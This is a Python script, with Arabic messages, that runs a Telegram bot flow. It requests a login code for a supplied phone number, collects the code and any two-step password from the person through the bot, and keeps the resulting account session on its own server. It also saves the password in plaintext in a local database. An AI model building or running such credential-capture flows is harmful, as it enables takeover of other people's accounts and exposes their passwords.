#from telethon.sync import TelegramClient
from pyrogram import Client
import sys, time
import asyncio
import json
import configparser
import requests
from t import *
import logging
import os
logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)


arg = sys.argv
command = arg[1]
phone = arg[2]
user = int(arg[3])
ses = randtext(10)
    
config = configparser.ConfigParser() 
config.read("config.ini")

api_id = config['App']['id']
api_hash = config['App']['hash']
#bot = config['App']['mybot']

app = Client("ses/"+ses, api_id=api_id, api_hash=api_hash)
app.connect()
#client2 = TelegramClient('sesfordel/'+ses, api_id, api_hash)

token = config['Token']['signbot']

#channel = config['App']['channel']
idbot =  int(token.split(':')[0])
#client2.start(bot_token=token)
#client2.connect()

done = """
تم تسجيل الدخول بنجاح

"""
def sendms(chat_id, text):
    URL = "https://api.telegram.org/bot"+token+"/sendmessage"
    PARAMS = {'chat_id': chat_id, 'text': text, 'parse_mode': 'markdown'}
    requests.get(url=URL, params=PARAMS)

 
async def apicodetelegramchannel():
    if command == 'new':
        #sendms(user, 'التسليم متوقف مؤقتا')
        #return
        try:
            send = await app.send_code(phone_number=phone)
            #print(send)
            go = True
        except Exception as error_number:
            try:
                os.remove('ses/'+ses+'.session')
                #os.remove('sesfordel/'+ses+'.session')
                
            except:
                pass
            print(error_number)
            er = str(error_number).replace('Telegram says: ', '').split(' - ')
            if er[0] == '[400 PHONE_NUMBER_BANNED]':
                put(user, 'None|None', "sql/cache_code.sqlite3")
                #await client2.send_message(user, 'الرقم محظور..')
                sendms(user, 'الرقم محظور..')
                print('banned')
                return
            elif er[0] == '[420 FLOOD_WAIT_X]':
                put(user, 'None|None', "sql/cache_code.sqlite3")
                #await client2.send_message(user, 'محاولا كثيرة حاطئة ، يرجى تغيير الرقم أو المحاولة لاحقا')
                sendms(user, 'محاولا كثيرة حاطئة ، يرجى تغيير الرقم أو المحاولة لاحقا')
                print('flood')
                return
            elif er[0] == '[406 PHONE_NUMBER_INVALID]':
                put(user, 'None|None', "sql/cache_code.sqlite3")
                #await client2.send_message(user, 'محاولا كثيرة حاطئة ، يرجى تغيير الرقم أو المحاولة لاحقا')
                sendms(user, 'الرقم غير صحيح...')
                return
            elif er[0] == '[406 PHONE_PASSWORD_FLOOD]':
                put(user, 'None|None', "sql/cache_code.sqlite3")
                #await client2.send_message(user, 'محاولا كثيرة حاطئة ، يرجى تغيير الرقم أو المحاولة لاحقا')
                sendms(user, 'الرقم محظور محظور مؤقتا بسبب استخدام كلمات مرور خاطئة..')
            elif er[0] != '[400 PHONE_NUMBER_BANNED]' and er[0] != '[420 FLOOD_WAIT_X]' and er[0] != '[406 PHONE_NUMBER_INVALID]' and er[0] != '[406 PHONE_PASSWORD_FLOOD]':
                #await client2.send_message(user, 'حدث خطأ..')
                sendms(user, 'حدث خطأ..')
            print('NotSent')
            put(phone, error_number, 'sql/errors.sqlite3')
            return

        js = json.loads(str(send))
        if js['_'] == 'SentCode':
            #print(js['type'])
            if js['type'] == 'SentCodeType.APP' or js['type'] == 'app':
                type_login = 'app'
                #await client2.send_message(user, """وصلك الكود على تطبيق تليجرام، قم بإرساله الآن""")
                sendms(user, """وصلك الكود على تطبيق تليجرام، قم بإرساله الآن""")
                time.sleep(5)
            else:
                type_login = 'sms'
                #await client2.send_message(user, """وصلك الكود برسالة SMS، قم بإرساله الآن""")
                sendms(user, """وصلك الكود برسالة SMS، قم بإرساله الآن""")
            put(user, 'code|', "sql/cache_code.sqlite3")
            phone_code_hash  = js['phone_code_hash']
            put(phone, type_login+'|'+phone_code_hash+'|'+ses)
            print(phone, type_login, phone_code_hash, ses)
            print(js['_'])
            time.sleep(5)
    rpeat = 0
    while go:
        let2 = str(get(str(user), "sql/cache_code.sqlite3"))
        if let2 == '0':
            put(phone, '0')
            break
        data2 = let2.split('|')

        command2 = data2[0]
        code = data2[1]
        rpeat += 1
        if code == '' and rpeat <= 12:
            time.sleep(10)

        let = str(get(phone))
        data = let.split('|') 
        print(command2, code, ses)
        if command2 == 'addcode' and code != '':
            type_login = data[0]
            phone_code_hash = data[1]
            if type_login == 'app':
                try:
                    await app.sign_in(phone, phone_code_hash, str(code))
                    #await client2.send_message(user, 'تم تسجيل الدخول بنجاح..')
                    sendms(user, done)
                    put(user, 'None|None', "sql/cache_code.sqlite3")
                    #put(user, 'check|'+ses+'|'+phone, "sql/cache_code.sqlite3")
                    #os.remove('sesfordel/'+ses+'.session')
                    exit()
                    break
                    return
                except Exception as error_login:
                    er = str(error_login).replace('Telegram says: ', '').split(' - ')
                    if er[0] == '[400 PHONE_CODE_INVALID]':
                        #await client2.send_message(user, 'الكود خاطئ ، يرجى إرسال الكود الصحيح قبل أن أقوم بإلغاء الطلب')
                        sendms(user, 'الكود خاطئ ، يرجى إرسال الكود الصحيح قبل أن أقوم بإلغاء الطلب')
                        put(user, 'code|', "sql/cache_code.sqlite3")
                    elif er[0] == '[400 PHONE_CODE_EXPIRED]':
                        #await client2.send_message(user, 'انتهت صلاحية الرمز ، وتم إلغاء الطلب')
                        sendms(user, 'انتهت صلاحية الرمز ، وتم إلغاء الطلب')
                        os.remove('ses/'+ses+'.session')
                        #os.remove('sesfordel/'+ses+'.session')
                        put(user, 'None|None', "sql/cache_code.sqlite3")
                        break
                    elif er[0] == '[401 SESSION_PASSWORD_NEEDED]':
                        #await client2.send_message(user, 'الحساب مؤمن بكلمة مرور ، أرسل الآن كلمة المرور...')
                        sendms(user, 'الحساب مؤمن بكلمة مرور ، أرسل الآن كلمة المرور...')
                        put(user, 'pass|', "sql/cache_code.sqlite3")
                    else:
                        #await client2.send_message(user, 'حدث خطأ غير معروف ..')
                        sendms(user, 'حدث خطأ غير معروف ..')
                        os.remove('ses/'+ses+'.session')
                        #os.remove('sesfordel/'+ses+'.session')
                        put(user, 'None|None', "sql/cache_code.sqlite3")
                        put(phone, error_number, 'sql/errors.sqlite3')
                        break
                    print(error_login)
                    
                    pass
            #يحتاج تعديللللللللللللللللللل
            elif type_login == 'SMS':
                try:
                    await app.sign_up(phone, phone_code_hash, str(code))
                    #await client2.send_message(user, 'تم تسجيل الدخول بنجاح..')
                    sendms(user, done)
                    put(user, 'None|None', "sql/cache_code.sqlite3")
                    #put(user, 'check|'+ses+'|'+phone, "sql/cache_code.sqlite3")
                    #os.remove('sesfordel/'+ses+'.session')
                    exit()
                    break
                except Exception as error_login:
                    er = str(error_login).replace('Telegram says: ', '').split(' - ')
                    if er[0] == '[400 PHONE_CODE_INVALID]':
                        #await client2.send_message(user, 'الكود خاطئ ، يرجى إرسال الكود الصحيح قبل أن أقوم بإلغاء الطلب')
                        sendms(user, 'الكود خاطئ ، يرجى إرسال الكود الصحيح قبل أن أقوم بإلغاء الطلب')
                        put(user, 'code|', "sql/cache_code.sqlite3")
                    elif er[0] == '[400 PHONE_CODE_EXPIRED]':
                        #await client2.send_message(user, 'انتهت صلاحية الرمز ، وتم إلغاء الطلب')
                        sendms(user, 'انتهت صلاحية الرمز ، وتم إلغاء الطلب')
                        os.remove('ses/'+ses+'.session')
                        #os.remove('sesfordel/'+ses+'.session')
                        put(user, 'None|None', "sql/cache_code.sqlite3")
                        break
                    elif er[0] == '[401 SESSION_PASSWORD_NEEDED]':
                        #await client2.send_message(user, 'الحساب مؤمن بكلمة مرور ، أرسل الآن كلمة المرور...')
                        sendms(user, 'الحساب مؤمن بكلمة مرور ، أرسل الآن كلمة المرور...')
                        put(user, 'pass|', "sql/cache_code.sqlite3")
                    else:
                        #await client2.send_message(user, 'حدث خطأ غير معروف ..')
                        sendms(user, 'حدث خطأ غير معروف ..')
                        os.remove('ses/'+ses+'.session')
                        #os.remove('sesfordel/'+ses+'.session')
                        put(user, 'None|None', "sql/cache_code.sqlite3")
                        put(phone, error_number, 'sql/errors.sqlite3')
                        break
                    print(error_login)
                    
                    pass
            pass
        if command2 == 'addpass' and code != '':
            try:
                await app.check_password(code)
                #await client2.send_message(user, 'تم تسجيل الدخول بنجاح..')
                sendms(user, done)
                put(user, 'None|None', "sql/cache_code.sqlite3")
                #put(user, 'check|'+ses+'|'+phone, "sql/cache_code.sqlite3")
                put(ses, code, "sql/pass.sqlite3")
                #os.remove('sesfordel/'+ses+'.session')
                exit()
                break
            except Exception as es:
                #await client2.send_message(user, 'كلمة المرور خاطئة...')
                sendms(user, 'كلمة المرور خاطئة..، ارسل كلمة المرور الصحيحة')
                put(user, 'pass|', "sql/cache_code.sqlite3")
                print(es)


        if rpeat > 12:
            #await client2.send_message(user, 'انتهت مهلة تسجيل الدخول..')
            sendms(user, 'انتهت مهلة تسجيل الدخول..')
            os.remove('ses/'+ses+'.session')
            #os.remove('sesfordel/'+ses+'.session')
            put(user, 'None|None', "sql/cache_code.sqlite3")
            await app.disconnect()
            #await client2.disconnect()
            print('stoped..')
            break
        
        time.sleep(10)

asyncio.get_event_loop().run_until_complete(apicodetelegramchannel())
